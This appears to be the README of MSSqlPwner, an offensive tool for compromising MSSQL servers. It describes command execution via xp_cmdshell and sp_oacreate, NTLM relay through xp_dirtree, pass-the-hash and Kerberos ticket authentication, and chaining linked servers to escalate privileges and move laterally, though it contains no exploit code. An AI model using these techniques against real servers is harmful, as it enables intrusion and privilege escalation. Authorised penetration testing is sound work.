MSSqlPwner is an advanced and versatile pentesting tool designed to seamlessly interact and pwn MSSQL servers.
That tool is based on impacket, which allows attackers to authenticate to databases using clear-text passwords NTLM Hashes,  and kerberos tickets.
With MSSqlPwner, users can execute custom commands through various methods, including custom assembly, `xp_cmdshell`, and `sp_oacreate(Ole Automation Procedures)` and much more. 

The tool starts with recursive enumeration on linked servers and possible impersonations in order to gather all the possible chains for command execution.

Also, the MSSqlPwner tool can be used for NTLM relay capabilities, utilizing functions such as `xp_dirtree`, `xp_subdirs`, `xp_fileexist`.

This tool can be used for lateral movement assessments and exploration of linked servers.

If the authenticated MSSQL user does not have permission to execute certain operations, the tool can find the right chain that will allows command execution. 
For example, if your user cant execute commands in the current context, the tool will build a chain that will use a link server and connect back to our server with escelated privileges.


## Build
Getting started with mssqlpwner is as smooth. You can do this by pulling directly from the repository:
```sh
podman build -t mssqlpwner .

- Notes:
- If you want to use tickets, you should use Service Principal Name (SPN) format (Like MSSQLSvc/hostname.domain.com:1433).

## Lateral Movement and Chain Exploration:
MSSqlPwner provides opportunities for lateral movement assessments and exploration of linked servers. 
In scenarios where the current session lacks administrative privileges, the tool attempts to find a chain that escalates its own privileges via linked servers. 
If a session on a linked server has higher privileges, the tool can interact with the linked server and perform a linked query back to the host with elevated privileges, enabling lateral movement with the target server.

## Authentication Methods:
Supported by multiple authentication methods, including:
- Windows credentials
- MSSQL credentials
- Kerberos authentication
- Kerberos tickets
- NTLM Hashes

The tool adapts to various scenarios and environments, verifying the effectiveness of authentication mechanisms.

Take your MSSQL environment assessments to the next level with the power and versatility of MSSqlPwner. 
Discover new possibilities for lateral movement, stealthy querying, and precise security evaluations with this the MSSqlPwner tool.
